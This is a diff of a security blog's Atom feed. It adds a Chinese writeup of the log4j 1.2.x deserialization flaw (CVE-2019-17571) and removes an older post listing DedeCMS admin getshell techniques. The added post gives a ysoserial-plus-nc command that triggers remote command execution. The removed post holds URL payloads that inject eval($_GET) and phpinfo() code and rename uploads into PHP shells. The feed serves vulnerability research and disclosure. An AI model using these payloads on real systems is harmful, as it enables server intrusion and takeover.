@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sunu11.com/"/>
-  <updated>2019-12-13T02:46:34.676Z</updated>
+  <updated>2019-12-26T02:41:50.313Z</updated>
   <id>http://sunu11.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>log4j小于1.2.17 Deserialization vulnerability</title>
+    <link href="http://sunu11.com/2019/12/26/log4j%E5%B0%8F%E4%BA%8E1.2.17%20Deserialization%20vulnerability/"/>
+    <id>http://sunu11.com/2019/12/26/log4j小于1.2.17 Deserialization vulnerability/</id>
+    <published>2019-12-26T01:36:25.000Z</published>
+    <updated>2019-12-26T02:41:50.313Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>PS: 文章仅用于研究漏洞原理,学习技术,禁止用于非法用途，否则后果自负!!!</strong></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Apache Log4j是美国阿帕奇（Apache）软件基金会的一款基于Java的开源日志记录工具。本次出现漏洞就是因为log4j在启动套接口服务器后，对监听端口传入的反序列化数据没有进行过滤而造成的。<a id="more"></a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>当log4j启动套接字服务器时，会监听命令行传入的端口。然后创建一个SocketNode类的对象来对端口接收到的数据进行处理。<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/log4jrce/CVE-2019-17571-1.png" alt="CVE-2019-17571-1"><br>在对象初始化时,将端口接收到的数据封装为一个Object流对象。在run()方法中直接调用readObject()进行反序列化操作。<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/log4jrce/CVE-2019-17571-2.png" alt="CVE-2019-17571-2"><br>因此只要运行的log4j有可以利用的Gadget就可以执行命令了。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>下载<span class="exturl" data-url="aHR0cHM6Ly9yZXBvMS5tYXZlbi5vcmcvbWF2ZW4yL2NvbW1vbnMtY29sbGVjdGlvbnMvY29tbW9ucy1jb2xsZWN0aW9ucy8zLjEvY29tbW9ucy1jb2xsZWN0aW9ucy0zLjEuamFy" title="https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar">commons-collections-3.1.jar<i class="fa fa-external-link"></i></span>,<span class="exturl" data-url="aHR0cDovL21pcnJvci5iaXQuZWR1LmNuL2FwYWNoZS9sb2dnaW5nL2xvZzRqLzEuMi4xNy9sb2c0ai0xLjIuMTcuemlw" title="http://mirror.bit.edu.cn/apache/logging/log4j/1.2.17/log4j-1.2.17.zip">log4j-1.2.17.jar<i class="fa fa-external-link"></i></span><br>将commons-collections-3.2.1.jar加入到log4j的classpath中,然后启动：<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/log4jrce/CVE-2019-17571-3.png" alt="CVE-2019-17571-3"><br>然后直接使用ysoserial生成恶意序列化数据通过nc发送给4560端口即可看到漏洞触发，命令执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">▶ java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections5 &quot;curl 127.0.0.1:9900&quot; | nc 127.0.0.1 4560</span><br></pre></td></tr></table></figure></p><p><img src="https://n-b.oss-cn-beijing.aliyuncs.com/log4jrce/CVE-2019-17571-4.png" alt="CVE-2019-17571-4"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>Apache官方已在新版本修复了该漏洞，Apache Log4j 1.2 版本官方已于2015年8月停止维护，建议升级到 2.8.2 或更高<span class="exturl" data-url="aHR0cDovL2xvZ2dpbmcuYXBhY2hlLm9yZy9sb2c0ai8yLngvaW5kZXguaHRtbA==" title="http://logging.apache.org/log4j/2.x/index.html">版本<i class="fa fa-external-link"></i></span></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUkx2dnpLYkJ3S3AtV2FyOThwdm45dw==" title="https://mp.weixin.qq.com/s/RLvvzKbBwKp-War98pvn9w">https://mp.weixin.qq.com/s/RLvvzKbBwKp-War98pvn9w<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvb2tVMnkwaXpmbktYWHRYRzNFZkxrUQ==" title="https://mp.weixin.qq.com/s/okU2y0izfnKXXtXG3EfLkQ">https://mp.weixin.qq.com/s/okU2y0izfnKXXtXG3EfLkQ<i class="fa fa-external-link"></i></span><br>感谢c0ny1大佬与清水川崎大佬指点</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;PS: 文章仅用于研究漏洞原理,学习技术,禁止用于非法用途，否则后果自负!!!&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Apache Log4j是美国阿帕奇（Apache）软件基金会的一款基于Java的开源日志记录工具。本次出现漏洞就是因为log4j在启动套接口服务器后，对监听端口传入的反序列化数据没有进行过滤而造成的。
+    
+    </summary>
+    
+      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="CVE-2019-17571" scheme="http://sunu11.com/tags/CVE-2019-17571/"/>
+    
+  </entry>
   
   <entry>
     <title>learning_CSP</title>
@@ -190,11 +213,11 @@
       <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
-    
       <category term="phpmyadmin" scheme="http://sunu11.com/tags/phpmyadmin/"/>
     
       <category term="thinkphp" scheme="http://sunu11.com/tags/thinkphp/"/>
+    
+      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
     
   </entry>
   
@@ -466,31 +489,6 @@
     
     
       <category term="生活" scheme="http://sunu11.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>DedeCMS V5.7 SP2后台漏洞小集合</title>
-    <link href="http://sunu11.com/2018/04/03/19/"/>
-    <id>http://sunu11.com/2018/04/03/19/</id>
-    <published>2018-04-03T06:20:22.000Z</published>
-    <updated>2018-11-10T12:10:01.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="记录一下最新版dedecms后台拿服务器的几个方式。"><a href="#记录一下最新版dedecms后台拿服务器的几个方式。" class="headerlink" title="记录一下最新版dedecms后台拿服务器的几个方式。"></a>记录一下最新版dedecms后台拿服务器的几个方式。</h3><p><strong>01、上传shell</strong></p><p>1、后台上传flash文件处未对文件内容作校验，可直接上传shell。<br>2、通过重命名功能：<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dede/file_manage_control.php?fmdo=rename&amp;oldfilename=/uploads/media/xxx/xxxx.swf&amp;newfilename=/sunu11.php</span><br></pre></td></tr></table></figure><p><strong>02、写入配置</strong><br>/dede/sys_verifies.php中可写进恶意代码至inc文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();//</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2、http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo();</span><br></pre></td></tr></table></figure><p><strong>03、数据库写入数据未过滤：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dedecms/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=xxx&amp;egroup=;phpinfo();$&amp;issign=1</span><br></pre></td></tr></table></figure><p>查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dedecms/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=ok</span><br><span class="line">or:</span><br><span class="line">http://localhost/data/enums/;phpinfo();$.php</span><br></pre></td></tr></table></figure><p><strong>05、模板问题：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dede/tag_test_action.php?url=a&amp;token=xxxxx&amp;partcode=&#123;dede:mochazz name=&apos;source&apos; runphp=&apos;yes&apos;&#125;phpinfo();&#123;/dede:mochazz&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;记录一下最新版dedecms后台拿服务器的几个方式。&quot;&gt;&lt;a href=&quot;#记录一下最新版dedecms后台拿服务器的几个方式。&quot; class=&quot;headerlink&quot; title=&quot;记录一下最新版dedecms后台拿服务器的几个方式。&quot;&gt;&lt;/a&gt;记录一下最新版dedecms后台拿服务器的几个方式。&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;01、上传shell&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;1、后台上传flash文件处未对文件内容作校验，可直接上传shell。&lt;br&gt;2、通过重命名功能：
-    
-    </summary>
-    
-      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="Dedecms" scheme="http://sunu11.com/tags/Dedecms/"/>
-    
-      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
     
   </entry>
   
